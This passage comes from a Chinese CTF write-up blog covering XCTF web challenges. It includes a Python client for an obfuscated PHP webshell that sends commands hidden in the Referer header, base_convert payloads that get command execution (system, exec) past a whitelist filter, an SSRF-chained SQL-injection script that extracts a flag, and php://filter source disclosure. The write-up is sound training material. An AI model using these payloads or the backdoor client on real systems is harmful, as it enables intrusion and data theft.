转换为适合url传输的base64格式</span></span><br><span class="line">        query.append((key, value))</span><br><span class="line">    <span class="comment"># 对payload进行加密</span></span><br><span class="line">    payload = (zlib.compress(<span class="string">&#x27;cmd&#x27;</span>.encode())).decode(<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"> <span class="comment"># 使用zlib.compress进行压缩操作 就是compress操作而这里的cmd是字符串而非bytes类型所以使用嗯code进行编码</span></span><br><span class="line">    payload = loop_xor(payload, xor_key)  <span class="comment"># 进行循环异或运算,相当于PHP代码中的x函数</span></span><br><span class="line">    payload = base64.urlsafe_b64encode(payload.encode()).decode()  <span class="comment"># 进行url的base64编码</span></span><br><span class="line">    payload = md5head + <span class="built_in">str</span>(payload)</span><br><span class="line">   <span class="comment"># print(payload)# 在开头补全$h 而这里的payload 是bytes类型所以转换成str</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对payload进行修改1</span></span><br><span class="line">    cut_index = random.randint(<span class="number">2</span>, <span class="built_in">len</span>(payload) - <span class="number">3</span>)</span><br><span class="line">    payload_pieces = (payload[<span class="number">0</span>:cut_index], payload[cut_index:], md5tail)</span><br><span class="line">    i_piece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>], payload_pieces[i_piece])</span><br><span class="line">        i_piece += <span class="number">1</span></span><br><span class="line">    <span class="comment"># 将payload作为查询字符串编码拼接到referer中</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.parse.urlencode(query)</span><br></pre></td></tr></table></figure>

<p> 这里的代码用于构造payload,包括添加payload两侧的随机填充数据,payload本身的加密,最终把加密混淆后的payload作为参数值传输到referer中</p>
</li>
<li><p>发送请求数据,并接收处理响应数据</p>
<p> 攻击代码写好了,下面仅需要发送请求并接收数据,解密后即可查看到攻击者的命令执行结果</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;Accept-Language&#x27;</span>: accept_lang_str</span><br><span class="line">        , <span class="string">&#x27;Referer&#x27;</span>: referer</span><br><span class="line">               &#125;</span><br><span class="line">    req = sess.get(url, headers=headers, proxies=proxies)</span><br><span class="line">    <span class="comment">#print(req.text)</span></span><br><span class="line">    html = req.text</span><br><span class="line">    <span class="comment"># 接收响应数据包</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xor_key, xor_key))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="comment">#print(output)</span></span><br><span class="line">    <span class="comment"># 如果没有响应包,则对其进行处理</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error, no backdoor response&#x27;</span>)</span><br><span class="line">        cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 如果收到响应数据包,则对其进行处理</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    output = output.encode(<span class="string">&#x27;base64&#x27;</span>)  <span class="comment"># base64_decode解码</span></span><br><span class="line">    output = loop_xor(output, xor_key)  <span class="comment"># 循环异或运算</span></span><br><span class="line">    output = zlib.decompress(output.encode())  <span class="comment"># geuncompress 运算</span></span><br><span class="line">    <span class="built_in">print</span>(output)  <span class="comment"># 输出响应信息</span></span><br><span class="line">    cmd = <span class="string">&quot;system(&#x27;&quot;</span> + <span class="built_in">input</span>(<span class="string">&#x27;shell &gt; &#x27;</span>) + <span class="string">&quot;&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p> 连接脚本获得数据</p>
<p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208904.png" alt="1646569346034"></p>
</li>
</ol>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092208908.png" alt="1646569355167"></p>
<h1 id="love-math攻防世界"><a href="#love-math攻防世界" class="headerlink" title="love_math攻防世界"></a>love_math攻防世界</h1><p>扫目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141115076.png" alt="image-20220314111502981"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141115588.png" alt="image-20220314111534555"></p>
<p>这题真简单..</p>
<p>打开网页得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="comment">#如果没有设置c参数就显示源码</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];<span class="comment">#将得到的c赋给</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;<span class="comment">#要是长度大于80就输出</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];<span class="comment">#黑名单</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;<span class="comment">#m表示多行匹配</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);<span class="comment">#匹配完的结果放到funcs数组里面,这里的preg_match_all将匹配到的元素放在一层数组里面</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">#如果不在数组里</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);<span class="comment">#eval输出c</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个匹配规则能过的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abs(1)	匹配出abs能过</span><br><span class="line">1abs()	匹配出abs能过</span><br><span class="line">absa()	匹配出absa不能过</span><br><span class="line">abs(a)	匹配出abs和a,a不在不能过</span><br><span class="line">abs()a	匹配出abs和a,a不在不能过</span><br></pre></td></tr></table></figure>

<p><strong>思路一</strong></p>
<p>拼接裁剪的方式,首先不能加入其他的字符,只能使用上面的字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:$pi=hypot.min.fmod;$pi=$pi&#123;2&#125;.$pi&#123;0&#125;.$pi&#123;2&#125;.$pi&#123;6&#125;.$pi&#123;7&#125;.$pi&#123;8&#125;.$pi&#123;3&#125;;$pi()</span><br></pre></td></tr></table></figure>

<p>这段payload分为三部分,</p>
<ul>
<li>首先定义一个变量名$pi,因为pi在白名单中最短,其值为phpot.min.fmod,因为hypot min fmod均在白名单中,而且phpinfo中的所有字符均可以在其中找到</li>
<li>然后从hypot.min.fmod中分别取第2 0 2 6 7 8 3位置的字符,拼接成phpinfo字符串,并重新赋值给$pi变量</li>
<li>最后执行$pi(),即执行phpinfo()函数.</li>
</ul>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141136070.png" alt="image-20220314113632005"></p>
<p>但是根据这个思路去getflag,怎么也会超过长度</p>
<p>而其中的关键是base_convert()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert() 函数在任意进制之间转换数字。</span><br><span class="line">语法</span><br><span class="line">base_convert(number,frombase,tobase);</span><br><span class="line"></span><br><span class="line">参数 	描述</span><br><span class="line">number 	必需。规定要转换的数。</span><br><span class="line">frombase 	必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">tobase 	必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">技术细节</span><br><span class="line">返回值： 	number 转换为指定进制。</span><br><span class="line">返回类型： 	String</span><br><span class="line">PHP 版本： 	4+</span><br></pre></td></tr></table></figure>

<p>这里可以使用16进制,还可以使用36进制,可以带上所有小写字母</p>
<p>36进制,是数据的一种表示方式,同我们日常生活中的表示方法不一样,它由0-9,a-z组成,字母不区分大小写,与十进制对应的关系是0-9对应0-9,a-z对应10-35</p>
<p>那么接下来我们就可以进行转换了,既然字母会有过滤我们就可以将字母转换成十进制的数字,在使用baseconvert(10,36)转换回来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo base_convert(&#x27;phpinfo&#x27;,36,10);</span><br><span class="line">#55490343972</span><br><span class="line">&lt;?php</span><br><span class="line">echo base_convert(55490343972,10,36);</span><br><span class="line">#phpinfo</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:base_convert(55490343972,10,36)()</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141153540.png" alt="image-20220314115340498"></p>
<p>接着我们使用system(‘ls’),这里因为不能转换()和’’只能转换字母</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo base_convert(&#x27;system&#x27;,36,10);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo base_convert(&#x27;ls&#x27;,36,10);</span><br><span class="line">#1751504350</span><br><span class="line">#784</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141158033.png" alt="image-20220314115838995"></p>
<p>接下来就是读取flag了,如果直接使用读取文件的函数file_get_contents中包含下划线,不在我们36进制之中,并且base_convert()的第一个参数太长会溢出,也就是10进制数没法无限大</p>
<p><strong>思路二</strong></p>
<p>借助getallheader()来控制请求头,通过请求头字段读取flag.php.这里也就类似于get,post之类的,但是只能控制小写字符,所以大写的直接被pass掉.getallheader()返回的是数组,要从数组里面取数据用array[‘xxx’].但是[]被waf了,因为{}中是可以带数字的,这里用getallheader(){1}可以分会自定义头1里面的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)</span><br><span class="line">#exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>exec()</strong> 执行   <code>command</code> 参数所指定的命令。  </p>
<p>base_convert(696468,10,36); 代表把696468从10进制转换为36进制，结果为exec。</p>
<p>base_convert(8768397090111664438,10,30);  代表把8768397090111664438从10进制转换为30进制，结果为getallheaders。注意这里不能用36进制，因为getallheaders的36进制转换为10进制后数太长会溢出，也就是无法把10进制数变回getallheader。所以我们在这里采用30进制。（当然这是在linux下使用php7.3版本的结果，如果是在windows下php7.0前的所有版本对于getallheader进行30-36的进制转换，再转换回来的时候都存在溢出，也就是无法把10进制数变回getallheader）</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141211795.png" alt="image-20220314121125721"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141214677.png" alt="image-20220314121409610"></p>
<p><strong>思路三</strong></p>
<p>使用system(nl*)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882)))</span><br></pre></td></tr></table></figure>

<p>base_convert(1751504350,10,36) ——–&gt;system</p>
<p>$pi(1438255411,14,34) ——&gt;hex2bin</p>
<p>dechex(1852579882) —–&gt;将十进制转为十六进制：6e6c202a（字符串形式是：nl *）</p>
<p>nl *可以读取当前目录下的所有文件；</p>
<h1 id="攻防世界isc-2"><a href="#攻防世界isc-2" class="headerlink" title="攻防世界isc-2"></a>攻防世界isc-2</h1><p>扫目录<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141737810.png" alt="image-20220314173657709"></p>
<p><strong>download.php</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141737377.png" alt="image-20220314173750346"></p>
<p><strong>downloads</strong></p>
<p>目录有文件浏览漏洞</p>
<p><strong>login</strong></p>
<p>下有个paper</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141739473.png" alt="image-20220314173902436"></p>
<p>点一下跳转到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:65396///index.php/login/download.php?dl=ssrf</span><br></pre></td></tr></table></figure>

<p>下载下来一个pdf里面是多半是ssrf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141743103.png" alt="image-20220314174342021"></p>
<p><strong>js</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141740414.png" alt="image-20220314174023371"></p>
<p><strong>secret</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141740440.png" alt="image-20220314174047400"></p>
<p><strong>secret.php</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141745816.png" alt="image-20220314174517774"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141749787.png" alt="image-20220314174949746"></p>
<p><strong>secret_debug.php</strong></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141746017.png" alt="image-20220314174635982"></p>
<p>显示ip错误,那么这里就应该是ssrf的利用.这里是secret_debug.php说明结构应该和secret差不多,那么这里就可以注入了.</p>
<p>这里小试一下sql注入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141922521.png" alt="image-20220314192223424"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;txtfirst_name&quot;</span>:<span class="string">&quot;1&#x27;&quot;</span>,	<span class="comment">#单引号出现报错</span></span><br><span class="line"> right syntax to use near <span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;01/10/2019&#x27;</span>,<span class="string">&#x27;3541534&#x27;</span>)<span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;txtfirst_name&quot;:&#x27;</span><span class="number">1</span><span class="string">&quot;&#x27;,  	#回显正常</span></span><br><span class="line"><span class="string"> right syntax to use near &#x27;5&#x27;,&#x27;01/10/2019&#x27;,&#x27;1516838&#x27;)&#x27; at line 1  </span></span><br></pre></td></tr></table></figure>

<p>并且在那么处爆了一个4</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141927199.png" alt="image-20220314192746161"></p>
<p>说明txtLast_name这里有回显,那么我们需要将语句构造到这里那么的话就需要使用&#x2F;**&#x2F;进行闭合一下下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141931569.png" alt="image-20220314193105531"></p>
<p>最终闭合之后在4处回显数据库名称</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203141931266.png" alt="image-20220314193137234"></p>
<p>python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://111.200.241.244:65396/download.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;s=3&amp;txtfirst_name=w%27%23&amp;txtmiddle_name=q&amp;txtLast_name=q&amp;txtname_suffix=w&amp;txtdob=22%2F11%2F1111&amp;txtdl_nmbr=1234561&amp;txtRetypeDL=1234561&amp;btnContinue2=Continue&#x27;</span></span><br><span class="line">s1 = s1.replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&quot;,&quot;&#x27;</span>)</span><br><span class="line">s1 = s1.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;:&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">#print(s1)这里替换一下</span></span><br><span class="line">subquery = <span class="string">&quot;database()&quot;</span><span class="comment">#获取数据库名</span></span><br><span class="line"><span class="comment">#ssrfw</span></span><br><span class="line">subquery = <span class="string">&quot;select table_name from information_schema.tables where table_schema=&#x27;ssrfw&#x27; limit 1&quot;</span></span><br><span class="line"><span class="comment">#cetcYssrf</span></span><br><span class="line">subquery = <span class="string">&quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment">#secretName</span></span><br><span class="line">subquery = <span class="string">&quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment">#value</span></span><br><span class="line">subquery = <span class="string">&quot;select value from cetcYssrf limit 1&quot;</span></span><br><span class="line"><span class="comment">#flag&#123;cpg9ssnu_OOOOe333eetc_2018&#125;</span></span><br><span class="line"><span class="built_in">id</span> = random.randint(<span class="number">1</span>,<span class="number">10000000</span>)</span><br><span class="line">params = &#123;<span class="string">&quot;s&quot;</span>:<span class="string">&quot;3&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtfirst_name&quot;</span>:<span class="string">&quot;L&#x27;,&#x27;1&#x27;,(&quot;</span>+subquery+<span class="string">&quot;),&#x27;1&#x27;/*&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtmiddle_name&quot;</span>:<span class="string">&quot;q&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtLast_name&quot;</span>:<span class="string">&quot;q&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtname_suffix&quot;</span>:<span class="string">&quot;w&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtdob&quot;</span>:<span class="string">&quot;*/,&#x27;01/10/2019&quot;</span>,</span><br><span class="line">          <span class="string">&quot;txtdl_nmbr&quot;</span>:<span class="built_in">id</span>,</span><br><span class="line">          <span class="string">&quot;txtRetypeDL&quot;</span>:<span class="built_in">id</span>,</span><br><span class="line">          <span class="string">&quot;btnContinue2&quot;</span>:<span class="string">&quot;Continue&quot;</span>&#125;</span><br><span class="line">d = <span class="string">&#x27;http://127.0.0.1/secret/secret_debug.php?&#x27;</span>+urllib.parse.urlencode(params)</span><br><span class="line">req = requests.get(url,params=&#123;<span class="string">&quot;dl&quot;</span>:d&#125;)</span><br><span class="line"><span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure>

<h1 id="攻防世界ics-05-preg-replace-函数-x2F-e-漏洞"><a href="#攻防世界ics-05-preg-replace-函数-x2F-e-漏洞" class="headerlink" title="攻防世界ics-05(preg_replace()函数 &#x2F;e 漏洞)"></a>攻防世界ics-05(preg_replace()函数 &#x2F;e 漏洞)</h1><p>查阅资料发现这里是一个文件包含漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:60854/index.php?page=index.php</span><br></pre></td></tr></table></figure>

<p>使用php:&#x2F;&#x2F;filter协议用于读取源码, php:&#x2F;&#x2F;input用于执行php代码</p>
<p>再次使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D; 参数读取文件</p>
<p>在使用转换过滤器php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;进行base64的编码</p>
<p>之后再次使用resource&#x3D;参数来过滤筛选过滤的数据流</p>
<p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php进行读取</p>
<p>具体实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:60854/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">posix_setuid</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;renderer&quot;</span> content=<span class="string">&quot;webkit&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;layui/css/layui.css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">nav</span>-<span class="title">item</span> <span class="title">layui</span>-<span class="title">this</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">page</span>=<span class="title">index</span>&quot;&gt;云平台设备维护中心&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">fieldset</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">elem</span>-<span class="title">field</span> <span class="title">layui</span>-<span class="title">field</span>-<span class="title">title</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>: 30<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">legend</span>&gt;设备列表&lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">table</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">hide</span>&quot; <span class="title">id</span>=&quot;<span class="title">test</span>&quot;&gt;&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">html</span>&quot; <span class="title">id</span>=&quot;<span class="title">switchTpl</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;!-- 这里的 <span class="title">checked</span> 的状态只是演示 --&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">sex</span>&quot; <span class="title">value</span>=&quot;</span>&#123;&#123;d.id&#125;&#125;<span class="string">&quot; lay-skin=&quot;</span><span class="keyword">switch</span><span class="string">&quot; lay-text=&quot;</span>开|关<span class="string">&quot; lay-filter=&quot;</span>checkDemo<span class="string">&quot; &#123;&#123; d.id==1 0003 ? &#x27;checked&#x27; : &#x27;&#x27; &#125;&#125;&gt;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;</span>layui/layui.js<span class="string">&quot; charset=&quot;</span>utf-<span class="number">8</span><span class="string">&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    layui.use(&#x27;table&#x27;, function() &#123;</span></span><br><span class="line"><span class="string">        var table = layui.table,</span></span><br><span class="line"><span class="string">            form = layui.form;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        table.render(&#123;</span></span><br><span class="line"><span class="string">            elem: &#x27;#test&#x27;,</span></span><br><span class="line"><span class="string">            url: &#x27;/somrthing.json&#x27;,</span></span><br><span class="line"><span class="string">            cellMinWidth: 80,</span></span><br><span class="line"><span class="string">            cols: [</span></span><br><span class="line"><span class="string">                [</span></span><br><span class="line"><span class="string">                    &#123; type: &#x27;numbers&#x27; 